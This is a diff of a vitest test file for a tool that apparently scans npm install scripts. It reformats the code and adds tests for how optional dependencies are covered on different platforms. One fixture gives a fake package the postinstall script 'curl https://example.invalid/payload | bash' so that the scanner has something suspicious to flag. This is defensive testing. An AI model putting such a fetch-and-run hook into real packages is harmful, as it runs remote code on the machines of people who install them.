@@ -1,13 +1,9 @@
-import {
-  mkdir,
-  mkdtemp,
-  rm,
-  writeFile
-} from 'node:fs/promises';
+import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
 import os from 'node:os';
 import path from 'node:path';
 import { describe, expect, it } from 'vitest';
 import { InstallScriptAnalyzer } from '../../src/analyzers/install-scripts/install-script-analyzer.js';
+import { isOmittedOnPlatform } from '../../src/core/dependencies/inventory.js';
 
 describe('InstallScriptAnalyzer', () => {
   it('detects suspicious lifecycle-script behavior', async () => {
@@ -16,10 +12,9 @@ describe('InstallScriptAnalyzer', () => {
     );
 
     try {
-      await mkdir(
-        path.join(root, 'node_modules', 'suspicious-package'),
-        { recursive: true }
-      );
+      await mkdir(path.join(root, 'node_modules', 'suspicious-package'), {
+        recursive: true
+      });
 
       await writeFile(
         path.join(root, 'package-lock.json'),
@@ -47,25 +42,19 @@ describe('InstallScriptAnalyzer', () => {
           name: 'suspicious-package',
           version: '1.0.0',
           scripts: {
-            postinstall:
-              'curl https://example.invalid/payload | bash'
+            postinstall: 'curl https://example.invalid/payload | bash'
           }
         })
       );
 
-      const result =
-        await new InstallScriptAnalyzer().analyze({ root });
+      const result = await new InstallScriptAnalyzer().analyze({ root });
 
       expect(result.findings.length).toBeGreaterThanOrEqual(2);
       expect(
-        result.findings.some(
-          (finding) => finding.ruleId === 'TLP-INSTALL-001'
-        )
+        result.findings.some((finding) => finding.ruleId === 'TLP-INSTALL-001')
       ).toBe(true);
       expect(
-        result.findings.some(
-          (finding) => finding.ruleId === 'TLP-INSTALL-002'
-        )
+        result.findings.some((finding) => finding.ruleId === 'TLP-INSTALL-002')
       ).toBe(true);
     } finally {
       await rm(root, {
@@ -151,5 +140,103 @@ describe('InstallScriptAnalyzer', () => {
     } finally {
       await rm(root, { recursive: true, force: true });
     }
+  });
+});
+
+describe('InstallScriptAnalyzer optional dependency coverage', () => {
+  it('excludes incompatible libc only when its identity is known', () => {
+    const pkg = { optional: true, libc: ['musl'] };
+    const known = isOmittedOnPlatform(pkg, 'linux', 'x64', 'glibc');
+    const matching = isOmittedOnPlatform(pkg, 'linux', 'x64', 'musl');
+    const unknown = isOmittedOnPlatform(pkg, 'linux', 'x64', 'unknown');
+    expect(known).toBe(true);
+    expect(matching).toBe(false);
+    expect(unknown).toBe(false);
+  });
+
+  async function lockfileProject(
+    entry: Record<string, unknown>
+  ): Promise<string> {
+    const root = await mkdtemp(path.join(os.tmpdir(), 'toolip-optional-'));
+    await mkdir(path.join(root, 'node_modules', 'present'), {
+      recursive: true
+    });
+    await writeFile(
+      path.join(root, 'node_modules', 'present', 'package.json'),
+      JSON.stringify({ name: 'present', version: '1.0.0' })
+    );
+    await writeFile(
+      path.join(root, 'package-lock.json'),
+      JSON.stringify({
+        name: 'fixture',
+        lockfileVersion: 3,
+        packages: {
+          '': {
+            name: 'fixture',
+            version: '1.0.0',
+            dependencies: { present: '1.0.0' },
+            optionalDependencies: { 'native-pkg': '1.0.0' }
+          },
+          'node_modules/present': { version: '1.0.0' },
+          'node_modules/native-pkg': { version: '1.0.0', ...entry }
+        }
+      })
+    );
+    return root;
+  }
+
+  async function coverageFor(entry: Record<string, unknown>) {
+    const root = await lockfileProject(entry);
+    try {
+      return (await new InstallScriptAnalyzer().analyze({ root })).coverage;
+    } finally {
+      await rm(root, { recursive: true, force: true });
+    }
+  }
+
+  it('excludes an uninstalled optional dependency whose os constraint rules out this platform', async () => {
+    expect(
+      await coverageFor({ optional: true, os: ['definitely-not-an-os'] })
+    ).toMatchObject({
+      state: 'complete',
+      eligible: 1,
+      scanned: 1,
+      skipped: 0,
+      excluded: 1
+    });
+  });
+
+  it('excludes when the cpu constraint rules out this architecture, and honours ! block entries', async () => {
+    expect(
+      await coverageFor({ optional: true, cpu: ['definitely-not-a-cpu'] })
+    ).toMatchObject({ state: 'complete', excluded: 1 });
+    expect(
+      await coverageFor({ optional: true, os: [`!${process.platform}`] })
+    ).toMatchObject({ state: 'complete', excluded: 1 });
+  });
+
+  it('does NOT exclude an optional package that applies to this platform but is missing', async () => {
+    expect(
+      await coverageFor({
+        optional: true,
+        os: [process.platform],
+        cpu: [process.arch]
+      })
+    ).toMatchObject({ state: 'partial', eligible: 2, skipped: 1 });
+  });
+
+  it('does NOT exclude an optional package with no platform constraints (failed install is not proof)', async () => {
+    expect(await coverageFor({ optional: true })).toMatchObject({
+      state: 'partial',
+      skipped: 1
+    });
+  });
+
+  it('still reports a required but uninstalled dependency as skipped', async () => {
+    expect(await coverageFor({})).toMatchObject({
+      state: 'partial',
+      eligible: 2,
+      skipped: 1
+    });
   });
 });
